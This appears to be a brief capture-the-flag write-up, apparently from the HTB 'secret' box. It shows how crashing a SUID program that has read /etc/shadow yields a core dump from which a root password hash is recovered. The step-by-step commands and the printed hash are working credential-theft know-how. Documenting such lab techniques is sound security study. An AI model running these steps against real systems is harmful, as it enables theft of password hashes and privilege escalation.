---
layout: post
title: Core Dump Technique
description: Core Dump Technique
summary: Core Dump Technique
tags: [linux,privesc]
minute: 1
---
## Overview
Attacker can force crash a program to generate a coredump so he can read the buffered data (eg`/etc/shadow` ) inside.

## Environment
* Program has SUID bit set

```bash
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count*
```

* Program also forces core dump generation

```c
prctl(PR_SET_DUMPABLE, 1);
```

* `fs.suid_dumpable` is set to 2.

```bash
dasith@secret:/opt$ cat /proc/sys/fs/suid_dumpable
2
dasith@secret:/opt$ 
```

## Steps
* Run program and put a sensitive file and stop at another user input

```bash
dasith@secret:/opt$ ./count 
Enter source file/directory name: /etc/shadow

Total characters = 1187
Total words      = 36
Total lines      = 36
Save results a file? [y/N]: 
```

* Background the program

```bash
dasith@secret:/opt$ ./count 
Enter source file/directory name: /etc/shadow

Total characters = 1187
Total words      = 36
Total lines      = 36
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ 
```

* Send `SIGSEGV` signal. You can also use `kill -BUS PID`.

```bash
dasith@secret:/opt$ kill -SIGSEGV `pidof count`
```

* Resume the job and you will see core dump has been generated

```bash
dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)
dasith@secret:/opt$ ls -lrt /var/crash/
total 32
-rw-r----- 1 dasith dasith 28756 Dec 11 04:51 _opt_count.1000.crash
dasith@secret:/opt$ 
```

* To analyze the coredump, use `apport-unpack` and open `CoreDump` file

```bash
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
dasith@secret:/opt$ strings /tmp/crash-report/CoreDump | grep root
root:$6$/0f5J.S8.u.dA78h$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::
dasith@secret:/opt$ 
```

## References
* HTB secret
